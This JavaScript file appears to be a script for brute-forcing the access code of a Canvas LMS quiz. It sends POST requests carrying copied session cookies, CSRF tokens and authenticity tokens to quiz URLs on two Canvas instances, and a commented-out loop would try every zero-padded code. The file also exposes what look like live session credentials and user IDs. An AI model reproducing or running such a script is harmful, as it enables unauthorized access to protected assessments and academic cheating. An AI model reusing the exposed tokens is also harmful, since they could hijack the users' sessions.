

async function fetchData(paddedNumber) {
    try {
        let x = await fetch("https://canvas.instructure.com/courses/9082325/quizzes/17568996/take?user_id=111564736", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"macOS\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "cookie": "_hp2_props.3001039959=%7B%22Base.appName%22%3A%22Canvas%22%7D; _hp2_id.3001039959=%7B%22userId%22%3A%223522416736145060%22%2C%22pageviewId%22%3A%221280289770610993%22%2C%22sessionId%22%3A%22693138928523052%22%2C%22identity%22%3A%22uu-2-e3054eb53520cfe6a509f4a967dadfe300cd395acde3dc4409902a0116abc4c1-5HNb67aMTxrOsdQOPLqCQRLWc10MftpqWFEpvsGw%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D; pseudonym_credentials=106867796%3A%3Af49a8d25a11bb3c3506503d3bd5708c2b56b9e701457b8fa37ab1b33b4bd7efc19e321de240152450957bb856c3ccd3aa216855796285b976c1e97306845ac35%3A%3Ae7689b163b1a0f732d7dfc34edbe20fe558d6d53d5df01fd31e9b200ad80b4ae; log_session_id=8c63b0c80965ed1b0f8ba8327c2533c3; _legacy_normandy_session=nDQ775MlE1at51-YyZFYFw+1i8OOIQwROncXj18XdQEL5mLeFmyvUz_phjIKkk_ABYTqQRQakghlS0rkyOqeEYSop6zE335NXyZxErUQl4ny4OY1C8PANxJZJ4ZkT4fsJGfyushy_qGQwwYunjjQ-oQUFt8sPAjZuOo60hnLHuv3CeP9d-oShUjh7tb82-EIOoSJmcubN7TwanLwe8Ex5muEwTn0ZnTg7BZhzN5Ezykp1agQUIq-km-_FulhbUhDPVfaYOoyKQDIN2U8CaGa5irjek2X24lsp6C2DYqh5ERcDFEFs90frxYkHW8YmUyvtDchJfqU3_A3jQRFdG0K466Uv1Oq8s1UWLLLs8Egzywl6vHi5srdAU0u6QInvWTRiA4UFK1qp49_yfMcao7bFup.KmYDZ8lIw0ymjCb33WWlXJkYEu0.ZgMorQ; canvas_session=nDQ775MlE1at51-YyZFYFw+1i8OOIQwROncXj18XdQEL5mLeFmyvUz_phjIKkk_ABYTqQRQakghlS0rkyOqeEYSop6zE335NXyZxErUQl4ny4OY1C8PANxJZJ4ZkT4fsJGfyushy_qGQwwYunjjQ-oQUFt8sPAjZuOo60hnLHuv3CeP9d-oShUjh7tb82-EIOoSJmcubN7TwanLwe8Ex5muEwTn0ZnTg7BZhzN5Ezykp1agQUIq-km-_FulhbUhDPVfaYOoyKQDIN2U8CaGa5irjek2X24lsp6C2DYqh5ERcDFEFs90frxYkHW8YmUyvtDchJfqU3_A3jQRFdG0K466Uv1Oq8s1UWLLLs8Egzywl6vHi5srdAU0u6QInvWTRiA4UFK1qp49_yfMcao7bFup.KmYDZ8lIw0ymjCb33WWlXJkYEu0.ZgMorQ; _csrf_token=ipXV8XBfbHK0TOh0gqg5JFL7Qt%2B3%2FhUe0D92OEEyoVXf4ee2NCwdQ8UHqUzG%2FnhvGrUM54POZluSDB5pGHfDHw%3D%3D",
                "Referer": "https://canvas.instructure.com/courses/9082325/quizzes/17568996/take?user_id=111564736",
                "Referrer-Policy": "no-referrer-when-downgrade"
            },
            "body": "utf8=%E2%9C%93&authenticity_token=PRdnv7t5MxGWavRKRgblbNLiVCR5izojltnfA6JK82FoY1X4%2FwpCIOchtXICUKQnmqwaHE27SWbU6rdS%2Bw%2BRKw%3D%3D&access_code=1234",
            "method": "POST"
        });






        // let x = await fetch("https://gatech.instructure.com/courses/368540/quizzes/541239/take?user_id=319636", {
        //     "headers": {
        //         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        //         "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        //         "cache-control": "max-age=0",
        //         "content-type": "application/x-www-form-urlencoded",
        //         "sec-ch-ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"",
        //         "sec-ch-ua-mobile": "?0",
        //         "sec-ch-ua-platform": "\"macOS\"",
        //         "sec-fetch-dest": "document",
        //         "sec-fetch-mode": "navigate",
        //         "sec-fetch-site": "same-origin",
        //         "sec-fetch-user": "?1",
        //         "upgrade-insecure-requests": "1",
        //         "cookie": "dpUseLegacy=true; log_session_id=4fc7c9ee80a76738d6b2cc2e23d2480d; _legacy_normandy_session=om0jTY3xYIfJw1h9X1YqAA+ZSZjwgVLPeHmXoKvVz2USOBKCKVfLNYJEryPtho45y8IPaki2LfVQ_g4y13Q7xkUthvFnAI7-IrldjdTvuqEoxWtBMYHh8sSjjwsP8c4MifTyCM1KZNvdQU_Bqku4ZQ8tzhRfxp0Lja5ooPSb5EBzMQTXVj9qof3Ic1VAFbPfKC1JI3HKuKsBw9RjKa388gqYk7QqG0WZ7gxFm-unBNPV8qGe0o_VKVNAdYFjAc_8qVbcuvV2Y8_2eK4R6V5gn7_QYK3AQVJaOfofCjKE1XQ8nHOsSLkql1I8NJVZTpdgInbRxk5QHQ3FnIie6J_MxdIlFn5Q5oJ4ppWHD_p_EsMCe6AVEEFf_EZTWuyullsQm4RvCqpUILDegMwxPYtyGwFufWWjXJlZUKcU5e-q3VRNNL7ZhrFvjMuDyOnYubXi6mZfvivlurmXXqBAJF_oyUtLTGON97FwoEedBbxjun-FxEnkr1aKjRvNWTeMVxCFv11CL7EA2eJkPoPyJjUjCLFqzoKYIrnFhldd0gwbEEXY6FT3A0XHygIz1EtyuxJeBbWvx4rNZRcN_fyqtA3ux3f8mrybe_92YSi44iRZPvpiqHNGnb-0gigWK8t0aA-lVQH3uBMRPuia2PhAHPbiSltheOjC0wZdUYzXPpF1Ww_kZaWUDPXFOIfKkB3FClQ05i66wZinJvkkPcnxUUdOrZONkjGPaTzqx3wicQu7gnQNGbDSRvRPdTrkdxiyeKvzYeS8dD77RwR3-bW9ZY-1PsmfDqB1wSMRXM_BFtCfDEthA.VfmI_lq69efVC-bIujifb7TOS7A.Zbl6_g; canvas_session=om0jTY3xYIfJw1h9X1YqAA+ZSZjwgVLPeHmXoKvVz2USOBKCKVfLNYJEryPtho45y8IPaki2LfVQ_g4y13Q7xkUthvFnAI7-IrldjdTvuqEoxWtBMYHh8sSjjwsP8c4MifTyCM1KZNvdQU_Bqku4ZQ8tzhRfxp0Lja5ooPSb5EBzMQTXVj9qof3Ic1VAFbPfKC1JI3HKuKsBw9RjKa388gqYk7QqG0WZ7gxFm-unBNPV8qGe0o_VKVNAdYFjAc_8qVbcuvV2Y8_2eK4R6V5gn7_QYK3AQVJaOfofCjKE1XQ8nHOsSLkql1I8NJVZTpdgInbRxk5QHQ3FnIie6J_MxdIlFn5Q5oJ4ppWHD_p_EsMCe6AVEEFf_EZTWuyullsQm4RvCqpUILDegMwxPYtyGwFufWWjXJlZUKcU5e-q3VRNNL7ZhrFvjMuDyOnYubXi6mZfvivlurmXXqBAJF_oyUtLTGON97FwoEedBbxjun-FxEnkr1aKjRvNWTeMVxCFv11CL7EA2eJkPoPyJjUjCLFqzoKYIrnFhldd0gwbEEXY6FT3A0XHygIz1EtyuxJeBbWvx4rNZRcN_fyqtA3ux3f8mrybe_92YSi44iRZPvpiqHNGnb-0gigWK8t0aA-lVQH3uBMRPuia2PhAHPbiSltheOjC0wZdUYzXPpF1Ww_kZaWUDPXFOIfKkB3FClQ05i66wZinJvkkPcnxUUdOrZONkjGPaTzqx3wicQu7gnQNGbDSRvRPdTrkdxiyeKvzYeS8dD77RwR3-bW9ZY-1PsmfDqB1wSMRXM_BFtCfDEthA.VfmI_lq69efVC-bIujifb7TOS7A.Zbl6_g; _csrf_token=aYOgdv5gHW3LpFcowsU5Q7NfgLez9RFBzPwbFNd3JxwltO5HiAdvN%2FjMLh6t9mguhWm3zdLGYAf8zFJmvx1ESA%3D%3D",
        //         "Referer": "https://gatech.instructure.com/courses/368540/quizzes/541239/take?user_id=319636",
        //         "Referrer-Policy": "no-referrer-when-downgrade"
        //     },
        //     "body": `utf8=%E2%9C%93&authenticity_token=tAP1XpeHKvxSY82w3l3bZbeq0FcP6d86wW2Ac%2FyUnmD4NLtv4eBYpmELtIaxbooIgZznLW7arnzxXckBlP79NA%3D%3D&access_code=${paddedNumber}`,
        //     "method": "POST"
        // });

        if (x.ok) {
            let data = await x.text();
            console.log(data)
        } else {
            console.log("not ok?")
            let data = await x.text();
            console.log(data)

        }
    } catch (e) {
        console.log(e)
    }
}

// function delayedOutput() {
//     for (let i = 0; i < 99999 + 1; i++) {
//         const pad = String(i).padStart(6, '0'); // Pad the number with leading zeros
//         console.log(pad); // Output the string
//         // fetchData(pad);
//     }
// }

// delayedOutput(); // Start the loop

fetchData();